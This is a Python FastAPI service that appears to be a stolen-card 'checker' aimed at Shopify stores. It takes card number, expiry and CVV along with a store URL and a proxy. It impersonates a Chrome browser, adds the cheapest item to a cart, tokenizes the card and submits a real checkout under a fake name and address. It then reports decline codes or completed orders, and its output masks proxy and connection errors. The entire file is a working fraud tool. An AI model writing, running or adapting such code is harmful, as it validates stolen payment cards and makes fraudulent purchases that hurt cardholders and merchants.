from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import uuid
import asyncio
import random

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
    clean_price = str(price).replace('$', '').strip()
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

async def get_cheapest_product(session, store_url):
    try:
        res = await session.get(f"{store_url}/products.json?limit=50", headers={"Accept": "application/json"})
        if res.status_code != 200: return None, "-"
        data = res.json()
        best_vid, lowest_price = None, float('inf')
        for prod in data.get('products', []):
            for var in prod.get('variants', []):
                if var.get('available'):
                    try:
                        p = float(var.get('price', 0))
                        if 0 < p < lowest_price: lowest_price, best_vid = p, var.get('id')
                    except: pass
        return str(best_vid) if best_vid else None, str(lowest_price) if best_vid else "-"
    except: return None, "-"

def extract_session_token(html):
    from html import unescape
    match = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html)
    if match: return unescape(match.group(1)).strip('"')
    return None

async def check_shopify_graphql(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC", "-", "Shopify API")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        checkout_data = {
            "email": f"test{random.randint(1000,9999)}@example.com",
            "first_name": "John", "last_name": "Doe",
            "address1": "4024 College Point Boulevard",
            "city": "Flushing", "province": "NY", "zip": "11354",
            "country": "US", "phone": "2494851515"
        }

        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=60) as session:
            # 0. Get Product
            variant_id, price = await get_cheapest_product(session, store_url)
            if not variant_id: return safe_response("No products found", "-", "Shopify API")

            # 1. Add to Cart & Get Tokens
            await session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1})
            res_chk = await session.get(f"{store_url}/checkout", allow_redirects=True)
            
            final_url = str(res_chk.url)
            if '/checkouts/cn/' not in final_url:
                if "cloudflare" in res_chk.text.lower(): return safe_response("Cloudflare Blocked IP", f"${price}", "Shopify API")
                return safe_response("Failed to get Checkout URL", f"${price}", "Shopify API")
            
            checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
            session_token = extract_session_token(res_chk.text)
            if not session_token: return safe_response("Session Token not found", f"${price}", "Shopify API")

            # 2. Tokenize Card
            scope_host = store_url.replace('https://', '').replace('http://', '').split('/')[0]
            card_payload = {
                "credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": "John Doe"},
                "payment_session_scope": scope_host
            }
            res_token = await session.post("https://checkout.pci.shopifyinc.com/sessions", json=card_payload, headers={"Origin": "https://checkout.pci.shopifyinc.com"})
            if res_token.status_code != 200: return safe_response("Failed to tokenize card (IP Banned)", f"${price}", "Shopify API")
            card_session_id = res_token.json().get("id")

            # 3. Proposal (GraphQL)
            gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
            gql_headers = {
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                'x-checkout-web-source-id': checkout_token,
                'x-checkout-one-session-token': session_token,
            }
            merch_id = str(uuid.uuid4())
            addr_data = {
                "address1": checkout_data["address1"], "city": checkout_data["city"], "countryCode": checkout_data["country"],
                "firstName": checkout_data["first_name"], "lastName": checkout_data["last_name"], "zoneCode": checkout_data["province"],
                "postalCode": checkout_data["zip"], "phone": checkout_data["phone"]
            }
            
            prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken sellerProposal{checkoutTotal{...on MoneyValueConstraint{value{amount}__typename}}__typename}__typename}__typename}}}}"""
            prop_vars = {
                "delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True},
                "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}},
                "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": checkout_data["email"]},
                "sessionInput": {"sessionToken": session_token}
            }
            
            res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
            if res_prop.status_code != 200: return safe_response("Proposal Failed", f"${price}", "Shopify API")
            prop_data = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            queue_token = prop_data.get('queueToken')

            # 4. Submit For Completion
            submit_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
            submit_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitFailed{reason}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
            submit_vars = {
                "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
                "input": {
                    "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token,
                    "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": checkout_data["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True},
                    "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": {"streetAddress": addr_data}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr_data}},
                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": checkout_data["email"], "phoneCountryCode": "US"}
                }
            }

            res_sub = await session.post(submit_url, json={"operationName": "SubmitForCompletion", "query": submit_query, "variables": submit_vars}, headers=gql_headers)
            if res_sub.status_code != 200: return safe_response("Submit Failed", f"${price}", "Shopify API")
            
            sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
            rtype = sub_data.get('__typename')
            
            if rtype == 'SubmitRejected':
                errs = sub_data.get('errors', [])
                code = errs[0].get('code', 'REJECTED') if errs else 'REJECTED'
                return safe_response(f"Declined: {code}", f"${price}", "Shopify API")
            
            receipt_id = sub_data.get('receipt', {}).get('id')
            if not receipt_id: return safe_response(f"Failed: {rtype}", f"${price}", "Shopify API")

            # 5. Poll For Receipt (الخطوة الأهم لمعرفة رد البنك)
            poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
            poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}...on ActionRequiredReceipt{id}}}"""
            
            for _ in range(10): # 10 محاولات كحد أقصى (كما في سكربتك)
                res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                if res_poll.status_code != 200: await asyncio.sleep(2); continue
                
                poll_data = res_poll.json().get('data', {}).get('receipt', {})
                p_type = poll_data.get('__typename')
                
                if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", f"${price}", "Shopify API")
                elif p_type == 'ActionRequiredReceipt': return safe_response("3D Secure Action Required", f"${price}", "Shopify API")
                elif p_type == 'FailedReceipt':
                    err_code = poll_data.get('processingError', {}).get('code', 'UNKNOWN_DECLINE')
                    if err_code == "INSUFFICIENT_FUNDS": return safe_response("Insufficient Funds", f"${price}", "Shopify API")
                    elif err_code == "INCORRECT_CVC": return safe_response("Incorrect CVC", f"${price}", "Shopify API")
                    elif err_code in ["INVALID_ADDRESS", "ZIP_MISMATCH"]: return safe_response("ZIP Code Mismatch", f"${price}", "Shopify API")
                    elif err_code == "DO_NOT_HONOR": return safe_response("Do Not Honor", f"${price}", "Shopify API")
                    return safe_response(f"Declined: {err_code}", f"${price}", "Shopify API")
                
                await asyncio.sleep(2) # انتظار ثانيتين بين كل محاولة كما يفعل السكربت

            return safe_response("Timeout waiting for Bank Receipt", f"${price}", "Shopify API")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify API")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify_graphql(cc, url, proxy)
    return JSONResponse(content=result)
